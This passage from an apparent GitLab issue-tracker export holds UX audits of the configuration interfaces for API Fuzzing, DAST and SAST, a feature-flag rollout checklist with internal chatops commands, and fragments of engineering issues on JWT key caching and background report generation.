This will be addressed by the addition of custom \"profiles\" (see [relevant issues](https://gitlab.com/gitlab-org/gitlab/-/issues/342742/#-relevant-issues) below).\n   1. `𐄂` JTBD 2 is not addressed by the configuration UI; users can only select a predefined profile at this time. This will be addressed by the addition of custom \"profiles\" (see [relevant issues](https://gitlab.com/gitlab-org/gitlab/-/issues/342742/#-relevant-issues) below).\n   1. `𐄂` JTBD 3 is not addressed within the API Fuzzing configuration flow. There is no way to run a \"demo\" scan to validate the configuration from the UI.\n\n#### Findings unique to API Fuzzing\n1. There is no warning or way to indicate if API Fuzzing is properly configured other than reviewing a specific pipeline instance. An erroneous configuration will still display API Fuzzing as `Enabled` _(Note: This has not yet been verified as a problem unique to API fuzzing)_\n\n#### Findings shared with other scanners\n1. Field validation is minimal or non-existent\n   1. There is no form field validation within the API Fuzzing configuration UI. All fields accept any value.\n1. Configuration values are not maintained when returning to the config page (DAST does not maintain values either)\n1. Unlike other scanners, the DAST CI/CD and API Fuzzing UIs both direct users to commit changes directly to the `.gitlab-ci.yml` file instead of creating a merge request. The process of creating a merge request is a separate, deliberate action users must take.\n1. The end of the configuration process (merging code to enable the feature) doesn't do a great job assuring users that the scanner is properly enabled\n   1. When API Fuzzing is successfully enabled, the only place to confirm this is on the pipeline details page or within the `Security \u0026 Compliance` menu. The change in system status is not easily discovered.\n1.

Users can only choose between an `active` or `passive` scan. Currently, DAST rules must be configured using [CI/CD variables](https://docs.gitlab.com/ee/user/application_security/dast/#available-cicd-variables) within the `.gitlab-ci.yml` file. **_CI/CD Variables are not relevant to on-demand scans_**\n1. `𐄂` JTBD 3 is not directly addressed within the DAST configuration flow. There is no way to run a \"demo\" scan to validate the configuration from the UI.\n\n#### Findings unique to DAST on-demand\n1. On-demand scans differ from other scanners because they can be run immediately (after configured) or scheduled for a later date\n1. On-demand scans have a different primary entry point than the other security scanners.\n    1. Entry point path: `Security \u0026 Compliance` → `On-demand Scans` [→ `New DAST scan`]\n    1. Users can still navigate to the on-demand DAST scan creation UI from the `Security \u0026 Compliance` → `Configuration` page, but the flow requires a few additional steps.\n        - Path is as follows: `Security \u0026 Compliance` → `Configuration` → `Manage [DAST] scans` → `New DAST scan`\n1. The configuration process is closely tied to the [DAST CI/CD config](https://gitlab.com/gitlab-org/gitlab/-/issues/342739) process, but requires additional input including a scan `name`, `description (optional)`, `branch`, and `schedule (optional)`\n1. On-demand scans can be saved for reuse (currently there is no option to run a scan without saving it)\n1. Profiles are shared with DAST CI/CD scans _(Not really \"unique\" but worth noting)_\n\n#### See the [DAST CI/CD audit](https://gitlab.com/gitlab-org/gitlab/-/issues/342739#findings-unique-to-dast-cicd-on-demand) for additional insights into DAST","state":"closed","created_at":"2021-10-08T16:40:41.377Z","updated_at":"2022-03-02T21:26:55.769Z","closed_at":"2021-11-19T15:05:03.373Z","closed_by":{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"},"labels":["Category:DAST","UX","auto updated","devops::secure","group::dynamic analysis","section::sec"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"}],"author":{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"},"type":"ISSUE","assignee":{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/342740","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":5,"completed_count":5},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"5 of 5 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/342740","notes":"https://gitlab.com/api/v4/projects/278964/issues/342740/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/342740/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#342740","relative":"#342740","full":"gitlab-org/gitlab#342740"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":95122099,"iid":342739,"project_id":278964,"title":"UX Audit: DAST CI/CD configuration UI","description":"## ⚡️ Summary\nAs part of [Secure: Scan Configuration Evaluation](https://gitlab.com/groups/gitlab-org/-/epics/6614), we are performing an audit of the states and UI patterns for every security scanner with a configuration interface.

Users can only choose between an `active` or `passive` scan.

There is no way to run a \"demo\" scan to validate the configuration from the UI. \n\n#### Findings unique to DAST (CI/CD + on-demand)\n1. The configuration process for DAST CI/CD is easily one of the more complicated workflows across all of GitLab's security scanners. \n   1. Requires users to create `Site` and `Scanner` profiles (separate, but integrated workflows)\n   1. To run an \"active\" scan against a target, the site profile must first be `verified`. _(Note: this process isn't explicitly documented in the workflow diagram above but adds to the overall complexity of enabling DAST.)_\n      1. DAST is the only scanner that requires users to verify ownership of the target\n   1. The complexity of the workflow can vary, depending on the state of a current project\n      1. Configuring DAST for the first time requires a handful of additional steps\n      1. If relevant site and scanner profiles already exist, the process can be quick but is still more involved than other scanners\n1. Unline other scanners, DAST utilizes reusable \"Profiles\" for UI configuration\n   1. Profiles allow users to make changes to their DAST configuration without having to update their code (changes made to in-use profiles can be applied without updating code)\n\n#### ~~Findings unique to DAST CI/CD~~\n\n#### Findings \u0026 themes shared with API fuzzing\n1. Unlike other scanners, the DAST CI/CD and API Fuzzing UIs both direct users to commit changes directly to the `.gitlab-ci.yml` file instead of creating a merge request. The process of creating a merge request is a separate, deliberate action users must take.\n1. Unlike most other scanners (fuzzing being the exception), DAST CI/CD requires users to manually create or update the `.gitlab-ci.yml` file.\n      1. Users aren't given much help if their project doesn't have a pipeline configuration file already. In this scenario, users must deviate from the process of enabling DAST and enter the workflow to create a pipeline first.  \n1. Both DAST and fuzzing have the concept of profiles. However, fuzzing profiles are premade and very basic at the moment. There are [plans](https://gitlab.com/gitlab-org/gitlab/-/issues/342742#-relevant-issues) to expand fuzzing profiles.\n\n#### Findings \u0026 themes observed across multiple scanners\n1. The end of the configuration process (merging code to enable the feature) doesn't do a great job assuring users that the scanner is properly enabled\n   * When DAST is successfully enabled, the only place to confirm this is on the pipeline details page or within the `Security \u0026 Compliance` menu. The change in system status is not easily discovered.\n1. Field validation is minimal or non-existing\n   1. The DAST configuration UI has some validation but there are opportunities for improvement\n1. Not all configuration options are exposed in the UI\n\n1.","state":"closed","created_at":"2021-10-08T16:38:15.640Z","updated_at":"2022-03-02T21:26:55.724Z","closed_at":"2021-11-19T15:06:48.125Z","closed_by":{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"},"labels":["Category:DAST","UX","auto updated","devops::secure","group::dynamic analysis","section::sec"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"}],"author":{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"},"type":"ISSUE","assignee":{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/342739","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":5,"completed_count":5},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"5 of 5 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/342739","notes":"https://gitlab.com/api/v4/projects/278964/issues/342739/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/342739/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#342739","relative":"#342739","full":"gitlab-org/gitlab#342739"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":95121863,"iid":342737,"project_id":278964,"title":"UX Audit: Dependency scanning configuration UI","description":"## ⚡️ Summary\nAs part of [Secure: Scan Configuration Evaluation](https://gitlab.com/groups/gitlab-org/-/epics/6614), we are performing an audit of the states and UI patterns for every security scanner with a configuration interface.

Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --group=gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e \u003cfeature-flag-name\u003e true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] If the feature might impact the user experience, notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nAll `/chatops` commands that target production should be done in the `#production` slack channel for visibility.\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2021-10-07T21:40:45.997Z","updated_at":"2021-12-03T17:21:51.971Z","closed_at":"2021-12-03T17:21:51.946Z","closed_by":{"id":3841241,"username":"dstull","name":"Doug

configuration UI","description":"## ⚡️ Summary\nAs part of [Secure: Scan Configuration Evaluation](https://gitlab.com/groups/gitlab-org/-/epics/6614), we are performing an audit of the states and UI patterns for every security scanner with a configuration interface. The goal of the audit is to identify patterns and inconsistencies and create recommendations focused on improving consistency and learnability between the scanners. **This issue is to track and document findings for SAST configuration.** \n\nThe parent issue that documents all scanners being audited is linked below: \u003cbr\u003e\n👉 https://gitlab.com/gitlab-org/gitlab/-/issues/340334\n\n## 📋 Plan\n* [x] Identify relevant JTBD\n* [x] Evaluate the configuration process and document existing workflows (user flows)\n* [x] Capture screenshots of the configuration interface including all possible states\n* [x] Review any new or upcoming configuration changes for SAST and note anything that deviates from the audit findings and/or adjust findings accordingly\n* [x] Document findings in an easy to digest way\n\n\n## 💼 JTBD\n1. When I am configuring a CI/CD security scan, I want to specify which assets need to be scanned and under which circumstances, So that I can ensure my assets are secure prior to or at their release.\n1. When I am configuring a security scan, I want to specify which types of vulnerabilities the scan should detect, So that we don't waste time sorting through irrelevant findings.\n1. When I am either enabling or configuring a security scan, I want to run a demo scan, So that I can validate my configuration before it is implemented\n\n## 📸 Screenshots\nSee design section below\n\n## 🚶 Workflow\n🎨 [FigJam File](https://www.figma.com/file/kM2VPg6xcXL5OS38nFoVds/SAST-UI-Configuration-Workflow-Oct-2021?node-id=0%3A1) \n![image](/uploads/9297474df2dc0ddcdf720d7aa5b8cc9e/image.png)\n![image](/uploads/e57fa98236628843947c53a125ff5ed4/image.png)\n\n\n## 📄 Relevant issues\n1. [Configuration UI for SAST](https://gitlab.com/groups/gitlab-org/-/epics/3262) (epic)\n    1. [Show a generic static message in the SAST Config UI](https://gitlab.com/gitlab-org/gitlab/-/issue)\n    2. [Display per-variable help link in SAST Config UI](https://gitlab.com/gitlab-org/gitlab/-/issues/238997)\n    3. [SAST Config input validation](https://gitlab.com/gitlab-org/gitlab/-/issues/238082)\n    4. [Enhancing SAST Config UI Elements](https://gitlab.com/gitlab-org/gitlab/-/issues/238076)\n2. [Static Analysis UX](https://gitlab.com/groups/gitlab-org/-/epics/3585) (epic)\n    1. [Add repository view to Excluded Paths variable in SAST Config UI](https://gitlab.com/gitlab-org/gitlab/-/issues/285152)\n    2. [Update SAST Configuration UI collapse/ accordion component](https://gitlab.com/gitlab-org/gitlab/-/issues/247040) (minor)\n3. [Custom rulesets](https://gitlab.com/gitlab-org/gitlab/-/issues/330792)\n\n## 💡 Findings\n#### Does the SAST configuration UI address the JTBD? \n2 of 3 JTBD are at least partly addressed within the SAST configuration UI\n1. `✓` JTBD 1 is addressed by the `Excluded Paths` field \n1. `✓` JTBD 1 is partly addressed by the `SAST Analyzers` section of the configuration UI. Users can select which languages to scan but cannot choose which vulnerabilities get reported\n1. `𐄂` JTBD 3 is not directly addressed within the SAST configuration flow. There is no way to run a \"demo\" scan to validate the configuration from the UI.\n\n#### Findings unique to SAST\n1. The configuration process for SAST differs between the free and ultimate plan tiers. The free tier does not have access to the [UI configuration screen](https://gitlab.com/gitlab-org/gitlab/-/issues/342661/designs/sastConfig-default.jpeg). GitLab core users (free tier) can enable SAST from the UI via an auto-generated merge request (similar to [secret detection](https://gitlab.com/gitlab-org/gitlab/-/issues/342741) and [dependency scanning](https://gitlab.com/gitlab-org/gitlab/-/issues/342737)). \n1. SAST configuration is positioned as one of the primary entry points into application security \n   - Promoted via a banner on project home page\n   - \"Add security testing\" button on the project homepage links to SAST documentation\n1. The configuration process is relatively simple compared to dynamic analysis scanners, but more complex than \"one-click configuration\" scanners like dependency scanning and secret detection\n   - Some configuration options are available to users\n   - The `.gitlab-ci.yml` file is automatically created and/or updated for users when enabling SAST _(Note: this behavior is shared with `dependency scanning` and `secret detection`)_\n   - The current/active configuration values are maintained in the UI when SAST is enabled\n   - Users are highly encouraged not to edit the SAST configuration. This is communicated through a few different techniques:\n      - The page description mentions: `Configuration changes made here override those provided by GitLab and are excluded from updates`\n      - Info text (a \"[description](https://design.gitlab.com/components/form#description)\") is displayed under any input fields that are changed from their default state: `Using custom settings. You won't receive automatic updates on this variable. Restore to default`\n      - Info banner is displayed if any analyzer is disabled ([view screenshot](https://gitlab.com/gitlab-org/gitlab/-/issues/342661/designs/sastConfig-analyzersExpanded-analyzerDisabledWarning.jpeg))\n\n\n#### Findings \u0026 themes observed across multiple scanners\n1. The end of the configuration process (merging code to enable the feature) doesn't do a great job assuring users that the scanner is properly enabled\n   - Enabling SAST requires a merge request and users who enable a scanner may not have access to merge the change themselves\n   - When SAST is successfully enabled, the only place to confirm this is on the pipeline details page or within the `Security \u0026 Compliance` menu. The change in system status is not easily discovered.\n1. Field validation is minimal or non-existing:\n   1. There is no form field validation within the SAST configuration UI, but fields can be reset to default if they are altered ([see related issue about validation](https://gitlab.com/gitlab-org/gitlab/-/issues/238082))","state":"closed","created_at":"2021-10-07T21:11:57.692Z","updated_at":"2022-03-11T23:46:59.080Z","closed_at":"2021-11-22T22:24:31.296Z","closed_by":{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"},"labels":["Category:SAST","UX","auto updated","devops::secure","group::static analysis","missed:14.5","section::sec"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"}],"author":{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"},"type":"ISSUE","assignee":{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/342661","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":5,"completed_count":5},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"5 of 5 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/342661","notes":"https://gitlab.com/api/v4/projects/278964/issues/342661/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/342661/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#342661","relative":"#342661","full":"gitlab-org/gitlab#342661"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":95063229,"iid":342652,"project_id":278964,"title":"Cache Atlassian JWT public keys","description":"The following discussion from !71080 should be addressed:\n\n- [ ] @mbobin started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/71080#note_691423765):  (+4 comments)\n\n    \u003e what's going to happen if the server is down?

Before implementing that issue, we should change the functionality of the chain of custody reports to generate those reports async via a background worker and send them as an email attachment to the requesting user.\n\nAs a single data point, generating a CoC report for gitlab-org/gitlab on staging.gitlab.com takes nearly 1 minute.\n\n## Implementation Proposal\n\n* Create a new sidekiq worker to generate the CoC report. (The logic of the generation itself will not change.)\n* Create new mailers to send the newly generated report.\n* Update the ~documentation to make it clear that this report is now generated in the

Proposal\n\nInvestigate why these jobs are failing, possibly ensure that the entity exists _before_ issuing the sidekiq job, avoiding unnecessary sidekiq load, error noise, etc.\n\n\n#
